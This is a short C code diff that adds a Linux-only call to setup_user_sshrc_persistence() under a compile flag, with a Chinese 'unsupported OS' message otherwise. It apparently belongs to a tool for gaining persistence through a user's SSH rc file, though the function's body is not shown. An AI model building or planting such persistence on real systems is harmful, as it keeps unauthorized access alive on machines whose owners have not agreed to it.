@@ -54,5 +54,13 @@ int main() {
     }
 #endif
 
+#ifdef SSHRC_MOD
+    if (strcmp(os, "linux") == 0) {
+        setup_user_sshrc_persistence();
+    } else {
+        printf("不支持的操作系统。\n");
+    }
+#endif
+
     return 0;
 }
